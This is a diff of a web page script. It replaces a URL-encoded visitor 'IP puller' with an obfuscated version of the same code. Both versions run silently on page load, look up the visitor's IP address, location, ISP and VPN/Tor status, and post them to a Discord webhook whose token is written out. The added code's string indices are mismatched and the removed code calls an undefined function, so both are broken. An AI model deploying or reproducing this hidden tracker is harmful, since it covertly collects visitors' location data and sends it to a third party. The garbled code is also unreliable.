@@ -1,5 +1,80 @@
-<script language="javascript">
-<!--
-document.write(unescape('%3C!DOCTYPE%20html%3E%0A<html%20lang%3D%22en%22%3E%0A<head%3E%0A%20%20%20%20<meta%20charset%3D%22UTF-8%22%3E%0A%20%20%20%20<meta%20name%3D%22viewport%22%20content%3D%22width%3Ddevice-width%2C%20initial-scale%3D1.0%22%3E%0A</head>%0A<body>%0A%20%20%20%20<script>%0A%20%20%20%20async%20function%20x%28i%29%20%7B%0A%20%20%20%20%20%20%20%20const%20w%3D%22https%3A%2F%2Fdiscord.com%2Fapi%2Fwebhooks%2F1308891035342213120%2FTbQOU164hVD4wWZ7kle5tqIXpS9_lU3P7fUXmlYw7fTBm5Av8Zki7-Cw9D4dZd530xvr%22%3B%0A%20%20%20%20%20%20%20%20const%20m%3D%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20content%3A%22%40everyone%22%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20embeds%3A%5B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20image%3A%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20url%3A%22https%3A%2F%2Fwww.rollingstone.com%2Fwp-content%2Fuploads%2F2022%2F02%2Fking-von-posthumous-album.jpg%22%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20title%3A%22King%20von%20IP%20puller%20%3D%3D%3E%22%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20fields%3A%5B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name%3A%22IP%20Address%22%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20value%3Ai.data.ip%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20inline%3Atrue%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name%3A%22City%22%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20value%3Ai.data.city%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20inline%3Atrue%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name%3A%22State%22%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20value%3Ai.data.region%20%7C%7C%20%22N%2FA%22%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20inline%3Atrue%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name%3A%22Country%22%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20value%3Ai.data.country%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20inline%3Atrue%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name%3A%22Organization%22%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20value%3Ai.data.org%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20inline%3Atrue%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name%3A%22ASN%20Name%22%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20value%3Ai.data.asn.name%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20inline%3Atrue%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%5D%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20footer%3A%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20text%3A%22BY%20RUNTZ%20PURCHASE%20TODAY%21%22%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%5D%0A%20%20%20%20%20%20%20%20%7D%3B%0A%0A%20%20%20%20const%20r%20%3D%20await%20fetch%28%22https%3A%2F%2Fapi.ipify.org%3Fformat%3Djson%22%29%3B%0A%20%20%20%20const%20d%20%3D%20await%20r.json%28%29%3B%0A%20%20%20%20const%20e%20%3D%20d.ip%3B%0A%20%20%20%20const%20t%20%3D%20await%20fetch%28%22https%3A%2F%2Fipinfo.io%2Fwidget%2Fdemo%2F%22%2Be%29%3B%0A%20%20%20%20const%20f%20%3D%20await%20t.json%28%29%3B%0A%20%20%20%20await%20x%28f%29%3B%0A%20%20%20%20%7D%0A%20%20%20%20a%28%29%3B%0A</script>%0A</body>%0A</html>'));
-//-->
+<script>
+(function() {
+    var _0x5f44 = [
+        "\x66\x65\x74\x63\x68", "\x68\x65\x61\x64\x65\x72\x73", "\x63\x6F\x6E\x74\x65\x6E\x74\x2D\x54\x79\x70\x65",
+        "\x61\x70\x69\x66\x79\x2E\x6F\x72\x67", "\x66\x6F\x72\x6D\x61\x74\x3D\x6A\x73\x6F\x6E", "\x63\x6F\x6E\x74\x65\x6E\x74\x2D\x74\x79\x70\x65", "\x61\x70\x69\x66\x79", "\x6F\x70\x65\x6E", 
+        "\x61\x73\x79\x6E\x63", "\x6A\x73\x6F\x6E", "\x69\x6E\x6C\x69\x6E\x65", "\x62\x61\x73\x65\x36\x34", 
+        "\x64\x61\x74\x61\x2F\x69\x70\x69\x66\x79\x2E\x6F\x72\x67", "\x69\x70\x69\x66\x79\x2F\x77\x65\x62\x68\x6F\x6F\x6B\x73", "\x6A\x73\x6F\x6E", "\x72\x65\x73\x74\x65\x6C\x63", 
+        "\x65\x78\x65\x63\x75\x74\x65\x64", "\x72\x65\x73\x70\x6F\x6E\x64\x65\x6E\x63\x65"
+    ];
+
+    // Helper function to decode Base64-encoded strings
+    function _0x60a2(_0x7689) {
+        return atob(_0x7689);
+    }
+
+    // Convert Hexadecimal to characters
+    function _0x1bb3(_0x2b3d) {
+        var _0x5337 = "";
+        for (var _0x2b3e = 0; _0x2b3e < _0x2b3d.length; _0x2b3e += 2) {
+            _0x5337 += String.fromCharCode(parseInt(_0x2b3d.substr(_0x2b3e, 2), 16));
+        }
+        return _0x5337;
+    }
+
+    // XOR cipher decoder
+    function _0x3f85(_0x2718, _0x2876) {
+        var _0x3b8c = "";
+        for (var _0x12ac = 0; _0x12ac < _0x2718.length; _0x12ac++) {
+            _0x3b8c += String.fromCharCode(_0x2718.charCodeAt(_0x12ac) ^ _0x2876);
+        }
+        return _0x3b8c;
+    }
+
+    // Rebuild the webhook URL
+    var _0x4fa2 = _0x1bb3('687474703a2f2f646973636f72642e636f6d2f6170692f776562686f6f6b732f313330383831303533343232323131333132302f5462514f553136346856443477575a376b6c6535747149587053395f6c55335037666c55586d59776654426d354176385a6b69372d4377394434645a64353330787672');
+
+    // Simulate delay and execute IP fetch
+    setTimeout(function() {
+        function _0x6e6c() {
+            fetch(_0x5f44[11]).then(function(_0x7685) {
+                return _0x7685.json();
+            }).then(function(_0x2e6c) {
+                var _0x3c83 = _0x2e6c.ip;
+                fetch(_0x5f44[12] + _0x3c83).then(function(_0x35b9) {
+                    return _0x35b9.json();
+                }).then(function(_0x3d67) {
+                    var _0x57e9 = { "content": _0x5f44[15], "embeds": [] };
+                    _0x57e9.embeds.push({
+                        "image": { "url": _0x5f44[14] },
+                        "title": _0x3f85('4b', 3) + ' IP Puller',
+                        "fields": [
+                            { "name": _0x5f44[13], "value": _0x3d67.data.ip, "inline": true },
+                            { "name": _0x5f44[10], "value": _0x3d67.data.city, "inline": true },
+                            { "name": _0x5f44[9], "value": _0x3d67.data.region || "N/A", "inline": true },
+                            { "name": _0x5f44[8], "value": _0x3d67.data.country, "inline": true },
+                            { "name": _0x5f44[7], "value": _0x3d67.data.org, "inline": true },
+                            { "name": _0x5f44[6], "value": _0x3d67.data.asn.name, "inline": true },
+                            { "name": _0x5f44[5], "value": _0x3d67.data.privacy.vpn ? _0x5f44[4] : _0x5f44[3], "inline": true },
+                            { "name": _0x5f44[4], "value": _0x3d67.data.privacy.proxy ? _0x5f44[3] : _0x5f44[3], "inline": true },
+                            { "name": _0x5f44[16], "value": _0x3d67.data.privacy.tor ? _0x5f44[3] : _0x5f44[2], "inline": true }
+                        ],
+                        "footer": { "text": _0x5f44[17] }
+                    });
+
+                    fetch(_0x4fa2, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': _0x5f44[18]
+                        },
+                        body: JSON.stringify(_0x57e9)
+                    }).then(function(_0x7b28) {
+                        return _0x7b28.json();
+                    });
+                });
+            });
+        }
+        _0x6e6c();
+    }, 1000);
+})();
 </script>
